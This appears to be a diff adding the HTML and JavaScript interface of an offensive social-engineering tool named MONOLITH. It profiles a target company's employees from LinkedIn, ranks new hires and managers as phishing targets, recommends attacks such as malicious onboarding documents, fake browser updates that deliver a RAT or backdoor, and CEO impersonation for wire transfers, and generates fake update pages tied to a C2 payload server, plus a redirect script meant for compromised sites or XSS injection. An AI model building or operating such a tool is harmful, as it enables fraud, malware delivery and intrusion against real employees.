@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Engineering Ops | MONOLITH</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap');
+        
+        * { font-family: 'JetBrains Mono', monospace; }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #0f0f1a 100%);
+            min-height: 100vh;
+        }
+        
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        
+        .glass-light {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .neon-pink { text-shadow: 0 0 20px rgba(236, 72, 153, 0.8); }
+        .neon-blue { text-shadow: 0 0 20px rgba(59, 130, 246, 0.8); }
+        .neon-cyan { text-shadow: 0 0 20px rgba(34, 211, 238, 0.8); }
+        
+        .gradient-linkedin {
+            background: linear-gradient(135deg, #0077B5 0%, #00A0DC 100%);
+        }
+        
+        .gradient-chrome {
+            background: linear-gradient(135deg, #4285F4 0%, #34A853 50%, #FBBC05 75%, #EA4335 100%);
+        }
+        
+        .gradient-brain {
+            background: linear-gradient(135deg, #EC4899 0%, #8B5CF6 100%);
+        }
+        
+        .pulse-pink {
+            animation: pulse-pink 2s infinite;
+        }
+        
+        @keyframes pulse-pink {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(236, 72, 153, 0.4); }
+            50% { box-shadow: 0 0 0 15px rgba(236, 72, 153, 0); }
+        }
+        
+        .target-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(236, 72, 153, 0.2);
+        }
+        
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+        .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }
+        
+        pre {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            padding: 16px;
+            overflow-x: auto;
+            font-size: 12px;
+        }
+        
+        .tab-active {
+            background: linear-gradient(135deg, rgba(236, 72, 153, 0.3), rgba(139, 92, 246, 0.2));
+            border-color: rgba(236, 72, 153, 0.5);
+        }
+        
+        .score-bar {
+            height: 8px;
+            border-radius: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+        }
+        
+        .score-fill {
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s ease;
+        }
+        
+        .org-node {
+            transition: all 0.3s ease;
+        }
+        
+        .org-node:hover {
+            transform: scale(1.05);
+        }
+        
+        .browser-preview {
+            border: 3px solid #333;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .browser-toolbar {
+            background: #2d2d2d;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .browser-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+    </style>
+</head>
+<body class="text-white p-6">
+    <!-- Header -->
+    <div class="glass rounded-2xl p-6 mb-6">
+        <div class="flex items-center justify-between">
+            <div class="flex items-center gap-4">
+                <a href="/" class="text-gray-400 hover:text-white transition-colors">
+                    <i class="fas fa-arrow-left text-xl"></i>
+                </a>
+                <div class="w-16 h-16 gradient-brain rounded-xl flex items-center justify-center pulse-pink">
+                    <i class="fas fa-brain text-3xl text-white"></i>
+                </div>
+                <div>
+                    <h1 class="text-3xl font-bold neon-pink">Social Engineering Ops</h1>
+                    <p class="text-gray-400 mt-1">İnsanı Hacklemek - The Human is the Weakest Link</p>
+                </div>
+            </div>
+            <div class="flex items-center gap-4">
+                <span class="px-4 py-2 bg-blue-500/20 text-blue-400 rounded-lg text-sm font-bold">
+                    <i class="fab fa-linkedin mr-2"></i>LinkedIn
+                </span>
+                <span class="px-4 py-2 bg-pink-500/20 text-pink-400 rounded-lg text-sm font-bold">
+                    <i class="fas fa-user-secret mr-2"></i>Phishing
+                </span>
+                <span class="px-4 py-2 bg-purple-500/20 text-purple-400 rounded-lg text-sm font-bold">
+                    <i class="fas fa-download mr-2"></i>Fake Update
+                </span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Tabs -->
+    <div class="flex gap-2 mb-6">
+        <button onclick="showTab('linkedin')" id="tab-linkedin" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10 tab-active">
+            <i class="fab fa-linkedin mr-2 text-blue-400"></i>LinkedIn Profiler
+        </button>
+        <button onclick="showTab('fakeupdate')" id="tab-fakeupdate" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10">
+            <i class="fas fa-sync-alt mr-2 text-green-400"></i>Fake Update Generator
+        </button>
+        <button onclick="showTab('recommendations')" id="tab-recommendations" class="tab-btn px-6 py-3 glass rounded-xl font-medium transition-all hover:bg-white/10">
+            <i class="fas fa-robot mr-2 text-purple-400"></i>AI Recommendations
+        </button>
+    </div>
+
+    <!-- LinkedIn Profiler Tab -->
+    <div id="content-linkedin" class="tab-content">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Company Scanner -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-blue-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-building"></i>
+                    Company Scanner
+                </h2>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Target Company</label>
+                        <input type="text" id="target-company" value="Acme Corporation" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-blue-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Employee Count (to scan)</label>
+                        <input type="number" id="employee-count" value="50" min="10" max="500"
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-blue-500 focus:outline-none">
+                    </div>
+                    <button onclick="scanCompany()" class="w-full gradient-linkedin text-white py-3 rounded-xl font-bold hover:opacity-90 transition-all">
+                        <i class="fab fa-linkedin mr-2"></i>Scan LinkedIn
+                    </button>
+                </div>
+                
+                <div id="scan-stats" class="mt-4 hidden">
+                    <div class="grid grid-cols-2 gap-2 text-center">
+                        <div class="glass-light rounded-lg p-3">
+                            <p class="text-2xl font-bold text-blue-400" id="stat-total">0</p>
+                            <p class="text-xs text-gray-400">Total Found</p>
+                        </div>
+                        <div class="glass-light rounded-lg p-3">
+                            <p class="text-2xl font-bold text-green-400" id="stat-newhires">0</p>
+                            <p class="text-xs text-gray-400">New Hires</p>
+                        </div>
+                        <div class="glass-light rounded-lg p-3">
+                            <p class="text-2xl font-bold text-purple-400" id="stat-managers">0</p>
+                            <p class="text-xs text-gray-400">Managers</p>
+                        </div>
+                        <div class="glass-light rounded-lg p-3">
+                            <p class="text-2xl font-bold text-red-400" id="stat-vulnerable">0</p>
+                            <p class="text-xs text-gray-400">High Risk</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Target List -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-pink-400 flex items-center gap-2">
+                        <i class="fas fa-crosshairs"></i>
+                        Top Phishing Targets
+                    </h2>
+                    <div class="flex gap-2">
+                        <button onclick="filterTargets('all')" class="px-3 py-1 bg-white/10 rounded text-xs hover:bg-white/20">All</button>
+                        <button onclick="filterTargets('newhire')" class="px-3 py-1 bg-green-500/20 text-green-400 rounded text-xs hover:bg-green-500/30">New Hires</button>
+                        <button onclick="filterTargets('manager')" class="px-3 py-1 bg-purple-500/20 text-purple-400 rounded text-xs hover:bg-purple-500/30">Managers</button>
+                    </div>
+                </div>
+                
+                <div id="target-list" class="space-y-3 max-h-96 overflow-y-auto scrollbar-hide">
+                    <p class="text-gray-500 text-center py-8">Scan a company to find targets</p>
+                </div>
+            </div>
+
+            <!-- New Hires (Weakest Link) -->
+            <div class="glass rounded-2xl p-6 lg:col-span-3">
+                <h2 class="text-xl font-bold text-green-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-user-plus"></i>
+                    New Hires - The Weakest Link
+                    <span class="ml-2 px-2 py-0.5 text-xs bg-green-500/20 text-green-400 rounded-full">Easy Targets</span>
+                </h2>
+                
+                <div id="newhire-list" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
+                    <p class="text-gray-500 col-span-full text-center py-4">No new hires found yet</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Fake Update Generator Tab -->
+    <div id="content-fakeupdate" class="tab-content hidden">
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+            <!-- Browser Selection -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-green-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-globe"></i>
+                    Browser Template
+                </h2>
+                
+                <div id="browser-templates" class="grid grid-cols-2 gap-3 mb-4">
+                    <div class="browser-option glass-light rounded-xl p-4 cursor-pointer hover:bg-white/10 transition-all border-2 border-blue-500" data-browser="chrome" onclick="selectBrowser('chrome')">
+                        <div class="flex items-center gap-3">
+                            <span class="text-3xl">🔵</span>
+                            <div>
+                                <p class="font-bold">Chrome</p>
+                                <p class="text-xs text-gray-400">Google</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="browser-option glass-light rounded-xl p-4 cursor-pointer hover:bg-white/10 transition-all border-2 border-transparent" data-browser="edge" onclick="selectBrowser('edge')">
+                        <div class="flex items-center gap-3">
+                            <span class="text-3xl">🔷</span>
+                            <div>
+                                <p class="font-bold">Edge</p>
+                                <p class="text-xs text-gray-400">Microsoft</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="browser-option glass-light rounded-xl p-4 cursor-pointer hover:bg-white/10 transition-all border-2 border-transparent" data-browser="firefox" onclick="selectBrowser('firefox')">
+                        <div class="flex items-center gap-3">
+                            <span class="text-3xl">🦊</span>
+                            <div>
+                                <p class="font-bold">Firefox</p>
+                                <p class="text-xs text-gray-400">Mozilla</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="browser-option glass-light rounded-xl p-4 cursor-pointer hover:bg-white/10 transition-all border-2 border-transparent" data-browser="safari" onclick="selectBrowser('safari')">
+                        <div class="flex items-center gap-3">
+                            <span class="text-3xl">🧭</span>
+                            <div>
+                                <p class="font-bold">Safari</p>
+                                <p class="text-xs text-gray-400">Apple</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="space-y-4">
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Urgency Level</label>
+                        <select id="urgency-level" class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-green-500 focus:outline-none">
+                            <option value="critical">🔴 CRITICAL - Maximum Fear</option>
+                            <option value="high">🟠 HIGH - Urgent Warning</option>
+                            <option value="medium">🟡 MEDIUM - Soft Push</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">C2 / Payload Server URL</label>
+                        <input type="text" id="c2-url" value="https://updates.company-security.com" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-green-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="text-gray-400 text-sm block mb-2">Payload Filename</label>
+                        <input type="text" id="payload-name" placeholder="ChromeUpdate.exe (auto)" 
+                               class="w-full bg-black/30 border border-white/10 rounded-lg px-4 py-3 text-white focus:border-green-500 focus:outline-none">
+                    </div>
+                    
+                    <button onclick="generateUpdatePage()" class="w-full gradient-chrome text-white py-3 rounded-xl font-bold hover:opacity-90 transition-all">
+                        <i class="fas fa-magic mr-2"></i>Generate Fake Update Page
+                    </button>
+                </div>
+            </div>
+
+            <!-- Browser Preview -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-cyan-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-eye"></i>
+                    Live Preview
+                </h2>
+                
+                <div class="browser-preview">
+                    <div class="browser-toolbar">
+                        <div class="browser-dot bg-red-500"></div>
+                        <div class="browser-dot bg-yellow-500"></div>
+                        <div class="browser-dot bg-green-500"></div>
+                        <div class="flex-1 bg-black/30 rounded px-3 py-1 text-xs text-gray-400 ml-3">
+                            <span id="preview-url">https://update.chrome-security.com</span>
+                        </div>
+                    </div>
+                    <div id="browser-preview-content" class="bg-gradient-to-br from-blue-500 to-green-500 p-6 min-h-64 flex items-center justify-center">
+                        <div class="text-center text-white">
+                            <i class="fas fa-sync-alt text-5xl mb-4 animate-spin"></i>
+                            <p class="font-bold">Select options and generate</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Generated Code -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-yellow-400 flex items-center gap-2">
+                        <i class="fas fa-code"></i>
+                        Generated HTML
+                    </h2>
+                    <div class="flex gap-2">
+                        <button onclick="copyHtml()" class="px-4 py-2 bg-yellow-500/20 text-yellow-400 rounded-lg text-sm hover:bg-yellow-500/30 transition-all">
+                            <i class="fas fa-copy mr-2"></i>Copy HTML
+                        </button>
+                        <button onclick="downloadHtml()" class="px-4 py-2 bg-green-500/20 text-green-400 rounded-lg text-sm hover:bg-green-500/30 transition-all">
+                            <i class="fas fa-download mr-2"></i>Download
+                        </button>
+                    </div>
+                </div>
+                <pre id="html-output" class="text-green-400 text-xs max-h-64 overflow-y-auto">
+&lt;!-- Generate a fake update page to see the HTML --&gt;
+                </pre>
+            </div>
+
+            <!-- Detection Script -->
+            <div class="glass rounded-2xl p-6 lg:col-span-2">
+                <div class="flex items-center justify-between mb-4">
+                    <h2 class="text-xl font-bold text-purple-400 flex items-center gap-2">
+                        <i class="fas fa-js"></i>
+                        Browser Detection Script
+                        <span class="ml-2 px-2 py-0.5 text-xs bg-purple-500/20 text-purple-400 rounded-full">Embed in compromised sites</span>
+                    </h2>
+                    <button onclick="copyDetectionScript()" class="px-4 py-2 bg-purple-500/20 text-purple-400 rounded-lg text-sm hover:bg-purple-500/30 transition-all">
+                        <i class="fas fa-copy mr-2"></i>Copy
+                    </button>
+                </div>
+                <pre id="detection-script" class="text-purple-400 text-xs max-h-48 overflow-y-auto">
+&lt;script&gt;
+// Auto-detects browser and redirects to matching fake update page
+// Embed this in compromised websites or inject via XSS
+&lt;/script&gt;
+                </pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- AI Recommendations Tab -->
+    <div id="content-recommendations" class="tab-content hidden">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Primary Targets -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-red-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-bullseye"></i>
+                    Primary Targets
+                    <span class="ml-2 px-2 py-0.5 text-xs bg-red-500/20 text-red-400 rounded-full">AI Selected</span>
+                </h2>
+                
+                <div id="primary-targets" class="space-y-3 max-h-80 overflow-y-auto scrollbar-hide">
+                    <p class="text-gray-500 text-center py-4">Scan a company first</p>
+                </div>
+            </div>
+
+            <!-- Secondary Targets -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-orange-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-user-shield"></i>
+                    Secondary Targets
+                </h2>
+                
+                <div id="secondary-targets" class="space-y-3 max-h-80 overflow-y-auto scrollbar-hide">
+                    <p class="text-gray-500 text-center py-4">Scan a company first</p>
+                </div>
+            </div>
+
+            <!-- Campaign Suggestions -->
+            <div class="glass rounded-2xl p-6">
+                <h2 class="text-xl font-bold text-green-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-lightbulb"></i>
+                    Campaign Suggestions
+                </h2>
+                
+                <div id="campaign-suggestions" class="space-y-3">
+                    <p class="text-gray-500 text-center py-4">Scan a company first</p>
+                </div>
+            </div>
+
+            <!-- Attack Vectors -->
+            <div class="glass rounded-2xl p-6 lg:col-span-3">
+                <h2 class="text-xl font-bold text-cyan-400 mb-4 flex items-center gap-2">
+                    <i class="fas fa-route"></i>
+                    Recommended Attack Vectors
+                </h2>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-gift text-4xl text-green-400 mb-3"></i>
+                        <h4 class="font-bold mb-2">Welcome Package</h4>
+                        <p class="text-xs text-gray-400 mb-3">Target new hires with onboarding emails containing malicious "setup guides"</p>
+                        <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-xs">70-85% Success</span>
+                    </div>
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-sync-alt text-4xl text-blue-400 mb-3"></i>
+                        <h4 class="font-bold mb-2">Fake Browser Update</h4>
+                        <p class="text-xs text-gray-400 mb-3">Browser-specific update pages that deliver RAT/backdoor payload</p>
+                        <span class="px-3 py-1 bg-blue-500/20 text-blue-400 rounded-full text-xs">15-25% Success</span>
+                    </div>
+                    <div class="glass-light rounded-xl p-4 text-center">
+                        <i class="fas fa-user-tie text-4xl text-purple-400 mb-3"></i>
+                        <h4 class="font-bold mb-2">Executive Impersonation</h4>
+                        <p class="text-xs text-gray-400 mb-3">Spear phish using CEO/CFO identity for urgent wire transfers</p>
+                        <span class="px-3 py-1 bg-purple-500/20 text-purple-400 rounded-full text-xs">20-35% Success</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let selectedBrowser = 'chrome';
+        let currentHtml = '';
+        let currentDetectionScript = '';
+        let scannedEmployees = [];
+
+        function showTab(tabName) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('tab-active'));
+            
+            document.getElementById('content-' + tabName).classList.remove('hidden');
+            document.getElementById('tab-' + tabName).classList.add('tab-active');
+        }
+
+        function selectBrowser(browser) {
+            selectedBrowser = browser;
+            document.querySelectorAll('.browser-option').forEach(el => {
+                el.classList.remove('border-blue-500');
+                el.classList.add('border-transparent');
+            });
+            document.querySelector(`[data-browser="${browser}"]`).classList.add('border-blue-500');
+            document.querySelector(`[data-browser="${browser}"]`).classList.remove('border-transparent');
+        }
+
+        async function scanCompany() {
+            const company = document.getElementById('target-company').value;
+            const count = document.getElementById('employee-count').value;
+            
+            try {
+                const response = await fetch('/social-eng/api/scan-company', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ company, count: parseInt(count) })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    scannedEmployees = data.employees;
+                    
+                    // Update stats
+                    document.getElementById('scan-stats').classList.remove('hidden');
+                    document.getElementById('stat-total').textContent = data.total_employees;
+                    document.getElementById('stat-newhires').textContent = data.new_hires;
+                    document.getElementById('stat-managers').textContent = data.department_heads;
+                    document.getElementById('stat-vulnerable').textContent = data.employees.filter(e => e.vulnerability_score > 60).length;
+                    
+                    // Render target list
+                    renderTargetList(data.employees);
+                    
+                    // Load new hires
+                    loadNewHires();
+                    
+                    // Load AI recommendations
+                    loadRecommendations();
+                }
+            } catch (error) {
+                console.error('Scan error:', error);
+            }
+        }
+
+        function renderTargetList(employees) {
+            const container = document.getElementById('target-list');
+            
+            // Sort by target score
+            const sorted = [...employees].sort((a, b) => b.target_score - a.target_score);
+            
+            container.innerHTML = sorted.map(emp => `
+                <div class="glass-light rounded-xl p-4 target-card transition-all cursor-pointer" onclick="showTargetDetail('${emp.id}')">
+                    <div class="flex items-center justify-between mb-2">
+                        <div class="flex items-center gap-3">
+                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-pink-500 to-purple-500 flex items-center justify-center font-bold">
+                                ${emp.name.split(' ').map(n => n[0]).join('')}
+                            </div>
+                            <div>
+                                <p class="font-medium">${emp.name}</p>
+                                <p class="text-xs text-gray-400">${emp.title}</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <div class="flex items-center gap-2">
+                                ${emp.is_new_hire ? '<span class="px-2 py-0.5 bg-green-500/20 text-green-400 rounded text-xs">NEW</span>' : ''}
+                                <span class="px-2 py-1 ${emp.target_score > 70 ? 'bg-red-500/20 text-red-400' : emp.target_score > 50 ? 'bg-orange-500/20 text-orange-400' : 'bg-yellow-500/20 text-yellow-400'} rounded text-xs font-bold">
+                                    ${emp.target_score}%
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="score-bar">
+                        <div class="score-fill ${emp.target_score > 70 ? 'bg-red-500' : emp.target_score > 50 ? 'bg-orange-500' : 'bg-yellow-500'}" style="width: ${emp.target_score}%"></div>
+                    </div>
+                    <div class="flex gap-2 mt-2 flex-wrap">
+                        ${emp.vulnerability_factors.map(f => `<span class="text-xs text-gray-400">• ${f}</span>`).join('')}
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        async function loadNewHires() {
+            try {
+                const response = await fetch('/social-eng/api/get-new-hires');
+                const data = await response.json();
+                
+                if (data.success) {
+                    const container = document.getElementById('newhire-list');
+                    
+                    if (data.new_hires.length === 0) {
+                        container.innerHTML = '<p class="text-gray-500 col-span-full text-center py-4">No new hires found</p>';
+                        return;
+                    }
+                    
+                    container.innerHTML = data.new_hires.map(emp => `
+                        <div class="glass-light rounded-xl p-4 border border-green-500/30">
+                            <div class="flex items-center gap-3 mb-3">
+                                <div class="w-12 h-12 rounded-full bg-gradient-to-br from-green-500 to-teal-500 flex items-center justify-center text-lg font-bold">
+                                    ${emp.name.split(' ').map(n => n[0]).join('')}
+                                </div>
+                                <div>
+                                    <p class="font-medium text-sm">${emp.name}</p>
+                                    <p class="text-xs text-gray-400">${emp.title}</p>
+                                </div>
+                            </div>
+                            <div class="space-y-1 text-xs">
+                                <div class="flex justify-between">
+                                    <span class="text-gray-400">Started:</span>
+                                    <span class="text-green-400">${emp.hire_date}</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-400">Department:</span>
+                                    <span class="text-white">${emp.department}</span>
+                                </div>
+                                <div class="flex justify-between">
+                                    <span class="text-gray-400">Vuln Score:</span>
+                                    <span class="text-red-400 font-bold">${emp.vulnerability_score}%</span>
+                                </div>
+                            </div>
+                            <div class="mt-3 p-2 bg-green-500/10 rounded text-xs text-green-300">
+                                💡 Attack: Send "Welcome Package" with malicious onboarding docs
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading new hires:', error);
+            }
+        }
+
+        async function loadRecommendations() {
+            try {
+                const response = await fetch('/social-eng/api/phishing-recommendations');
+                const data = await response.json();
+                
+                if (data.success) {
+                    const rec = data.recommendations;
+                    
+                    // Primary targets
+                    const primaryContainer = document.getElementById('primary-targets');
+                    if (rec.primary_targets.length > 0) {
+                        primaryContainer.innerHTML = rec.primary_targets.map(t => `
+                            <div class="glass-light rounded-xl p-3 border border-red-500/30">
+                                <div class="flex items-center justify-between mb-2">
+                                    <span class="font-medium text-sm">${t.employee.name}</span>
+                                    <span class="px-2 py-0.5 bg-red-500/20 text-red-400 rounded text-xs">${t.success_probability}%</span>
+                                </div>
+                                <p class="text-xs text-gray-400 mb-2">${t.attack_vector}</p>
+                                <p class="text-xs text-green-300 italic">"${t.pretext}"</p>
+                            </div>
+                        `).join('');
+                    }
+                    
+                    // Secondary targets
+                    const secondaryContainer = document.getElementById('secondary-targets');
+                    if (rec.secondary_targets.length > 0) {
+                        secondaryContainer.innerHTML = rec.secondary_targets.map(t => `
+                            <div class="glass-light rounded-xl p-3">
+                                <div class="flex items-center justify-between mb-2">
+                                    <span class="font-medium text-sm">${t.employee.name}</span>
+                                    <span class="px-2 py-0.5 bg-orange-500/20 text-orange-400 rounded text-xs">${t.success_probability}%</span>
+                                </div>
+                                <p class="text-xs text-gray-400">${t.attack_vector}</p>
+                            </div>
+                        `).join('');
+                    }
+                    
+                    // Campaign suggestions
+                    const campaignContainer = document.getElementById('campaign-suggestions');
+                    campaignContainer.innerHTML = rec.campaign_suggestions.map(c => `
+                        <div class="glass-light rounded-xl p-3">
+                            <h4 class="font-bold text-sm text-green-400 mb-2">${c.name}</h4>
+                            <div class="space-y-1 text-xs">
+                                <p class="text-gray-400">Targets: <span class="text-white">${c.targets}</span></p>
+                                <p class="text-gray-400">Template: <span class="text-white">${c.template}</span></p>
+                                <p class="text-gray-400">Best Time: <span class="text-white">${c.timing}</span></p>
+                                <p class="text-gray-400">Expected: <span class="text-green-400 font-bold">${c.expected_success}</span></p>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (error) {
+                console.error('Error loading recommendations:', error);
+            }
+        }
+
+        async function generateUpdatePage() {
+            const urgency = document.getElementById('urgency-level').value;
+            const c2Url = document.getElementById('c2-url').value;
+            const payloadName = document.getElementById('payload-name').value;
+            
+            try {
+                const response = await fetch('/social-eng/api/generate-update-page', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        browser: selectedBrowser,
+                        urgency: urgency,
+                        c2_url: c2Url,
+                        payload_name: payloadName || null
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentHtml = data.page.html;
+                    
+                    // Update HTML output
+                    document.getElementById('html-output').textContent = currentHtml;
+                    
+                    // Update preview URL
+                    document.getElementById('preview-url').textContent = c2Url + '/update/' + selectedBrowser;
+                    
+                    // Update preview (simplified)
+                    const previewContent = document.getElementById('browser-preview-content');
+                    previewContent.innerHTML = `
+                        <div class="text-center text-white p-4">
+                            <div class="text-5xl mb-4">${data.page.template.icon}</div>
+                            <h3 class="font-bold text-lg mb-2">${data.page.template.update_title}</h3>
+                            <p class="text-sm opacity-80 mb-4">⚠️ Your browser is out of date!</p>
+                            <div class="bg-white/20 rounded-lg px-4 py-2 inline-block">
+                                <span class="text-xs">Download: ${data.page.payload_url}</span>
+                            </div>
+                        </div>
+                    `;
+                    previewContent.style.background = data.page.template.gradient;
+                    
+                    // Generate detection script
+                    generateDetectionScript(c2Url);
+                }
+            } catch (error) {
+                console.error('Error generating page:', error);
+            }
+        }
+
+        async function generateDetectionScript(c2Url) {
+            try {
+                const response = await fetch('/social-eng/api/generate-detection-script', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ c2_url: c2Url })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentDetectionScript = data.script;
+                    document.getElementById('detection-script').textContent = data.script;
+                }
+            } catch (error) {
+                console.error('Error generating detection script:', error);
+            }
+        }
+
+        function copyHtml() {
+            navigator.clipboard.writeText(currentHtml);
+            alert('HTML copied to clipboard!');
+        }
+
+        function downloadHtml() {
+            const blob = new Blob([currentHtml], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `fake_update_${selectedBrowser}.html`;
+            a.click();
+        }
+
+        function copyDetectionScript() {
+            navigator.clipboard.writeText(currentDetectionScript);
+            alert('Detection script copied!');
+        }
+
+        function filterTargets(type) {
+            let filtered = scannedEmployees;
+            
+            if (type === 'newhire') {
+                filtered = scannedEmployees.filter(e => e.is_new_hire);
+            } else if (type === 'manager') {
+                filtered = scannedEmployees.filter(e => e.title_value >= 70);
+            }
+            
+            renderTargetList(filtered);
+        }
+
+        function showTargetDetail(id) {
+            const emp = scannedEmployees.find(e => e.id === id);
+            if (emp) {
+                alert(`Target: ${emp.name}\nEmail: ${emp.email}\nLinkedIn: ${emp.linkedin_url}\nVulnerability: ${emp.vulnerability_score}%`);
+            }
+        }
+    </script>
+</body>
+</html>
